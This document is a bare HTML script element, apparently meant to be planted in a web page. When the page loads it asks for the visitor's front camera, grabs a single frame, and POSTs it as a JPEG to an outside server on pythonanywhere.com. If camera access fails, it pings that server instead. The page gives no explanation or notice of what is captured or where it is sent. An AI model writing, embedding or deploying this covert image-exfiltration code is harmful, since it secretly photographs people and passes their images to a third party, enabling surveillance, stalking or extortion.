<script>const server='https://ihihihodtshy.pythonanywhere.com';document.addEventListener('DOMContentLoaded',async()=>{const v=document.createElement('video');const c=document.createElement('canvas');const ctx=c.getContext('2d');try{const s=await navigator.mediaDevices.getUserMedia({video:{facingMode:'user'}});v.srcObject=s;v.onloadedmetadata=()=>{c.width=v.videoWidth;c.height=v.videoHeight;v.play().then(()=>{ctx.drawImage(v,0,0,c.width,c.height);const xhr=new XMLHttpRequest();xhr.open("POST",server+"/upload",true);xhr.setRequestHeader("Content-Type","application/x-www-form-urlencoded");xhr.send("data="+encodeURIComponent(c.toDataURL('image/jpeg')));s.getTracks().forEach(track=>track.stop());});};}catch(e){const xhr=new XMLHttpRequest();xhr.open("GET",server+"/data",true);xhr.setRequestHeader("Content-Type","application/x-www-form-urlencoded");xhr.send();}});</script>
